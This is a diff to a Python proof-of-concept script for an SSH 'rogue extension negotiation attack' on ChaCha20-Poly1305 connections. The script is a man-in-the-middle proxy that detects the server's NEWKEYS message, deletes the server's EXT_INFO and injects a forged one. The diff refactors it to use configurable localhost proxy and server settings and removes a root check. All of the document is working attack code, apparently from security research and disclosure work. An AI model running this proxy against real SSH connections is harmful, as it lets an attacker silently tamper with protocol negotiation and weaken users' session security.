@@ -1,5 +1,5 @@
 #!/usr/bin/python3
-import os, socket, sys
+import socket
 from threading import Thread
 from binascii import unhexlify
 
@@ -12,23 +12,28 @@ from binascii import unhexlify
 ## Licensed under Apache License 2.0 http://www.apache.org/licenses/LICENSE-2.0    ##
 #####################################################################################
 
-INTERFACE = 'eth0'
-TARGET_PORT = 22
-TARGET_IP = '192.168.22.10'
+# IP and port for the TCP proxy to bind to
+PROXY_IP = '127.0.0.1'
+PROXY_PORT = 2222
 
-def is_root():
-    return os.geteuid() == 0
+# IP and port of the server
+SERVER_IP = '127.0.0.1'
+SERVER_PORT = 22
 
-asyncssh_newkeys_start = b'\x00\x00\x00\x0c\x0a\x15'
-def contains_asyncssh_newkeys(data):
-    return asyncssh_newkeys_start in data
+# Length of the individual messages
+NEW_KEYS_LENGTH = 16
+SERVER_EXT_INFO_LENGTH = 676
+
+newkeys_payload = b'\x00\x00\x00\x0c\x0a\x15'
+def contains_newkeys(data):
+    return newkeys_payload in data
 
 # Empty EXT_INFO here to keep things simple, but may also contain actual extensions like server-sig-algs
 rogue_ext_info = unhexlify('0000000C060700000000000000000000')
 def insert_rogue_ext_info(data):
-    newkeys_index = data.index(asyncssh_newkeys_start)
+    newkeys_index = data.index(newkeys_payload)
     # Insert rogue authentication request and remove SSH_MSG_EXT_INFO
-    return data[:newkeys_index] + rogue_ext_info + data[newkeys_index:newkeys_index + 16] + data[newkeys_index + 16 + 676:]
+    return data[:newkeys_index] + rogue_ext_info + data[newkeys_index:newkeys_index + NEW_KEYS_LENGTH] + data[newkeys_index + NEW_KEYS_LENGTH + SERVER_EXT_INFO_LENGTH:]
 
 def forward_client_to_server(client_socket, server_socket):
     try:
@@ -47,11 +52,11 @@ def forward_server_to_client(client_socket, server_socket):
     try:
         while True:
             server_data = server_socket.recv(4096)
-            if contains_asyncssh_newkeys(server_data):
+            if contains_newkeys(server_data):
                 print("[+] SSH_MSG_NEWKEYS sent by server identified!")
-                if len(server_data) < 692:
+                if len(server_data) < NEW_KEYS_LENGTH + SERVER_EXT_INFO_LENGTH:
                     print("[+] server_data does not contain all messages sent by the server yet. Receiving additional bytes until we have 692 bytes buffered!")
-                while len(server_data) < 692:
+                while len(server_data) < NEW_KEYS_LENGTH + SERVER_EXT_INFO_LENGTH:
                     server_data += server_socket.recv(4096)
                 print(f"[d] Original server_data before modification: {server_data.hex()}")
                 server_data = insert_rogue_ext_info(server_data)
@@ -66,24 +71,20 @@ def forward_server_to_client(client_socket, server_socket):
     server_socket.close()
 
 if __name__ == '__main__':
-    if not is_root():
-        print("[!] Script must be run as root!")
-        sys.exit(1)
-
     print("--- Proof of Concept for the rogue extension negotiation attack (ChaCha20-Poly1305) ---")
     mitm_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    mitm_socket.bind(("0.0.0.0", TARGET_PORT))
+    mitm_socket.bind((PROXY_IP, PROXY_PORT))
     mitm_socket.listen(5)
 
-    print("[+] MitM Proxy started. Listening on port 22 for incoming connections...")
+    print(f"[+] MitM Proxy started. Listening on {(PROXY_IP, PROXY_PORT)} for incoming connections...")
 
     try:
         while True:
             client_socket, client_addr = mitm_socket.accept()
             print(f"[+] Accepted connection from: {client_addr}")
-            print(f"[+] Establishing new server connection to {(TARGET_IP, TARGET_PORT)}.")
+            print(f"[+] Establishing new server connection to {(SERVER_IP, SERVER_PORT)}.")
             server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            server_socket.connect((TARGET_IP, TARGET_PORT))
+            server_socket.connect((SERVER_IP, SERVER_PORT))
             print("[+] Spawning new forwarding threads to handle client connection.")
             Thread(target=forward_client_to_server, args=(client_socket, server_socket)).start()
             Thread(target=forward_server_to_client, args=(client_socket, server_socket)).start()
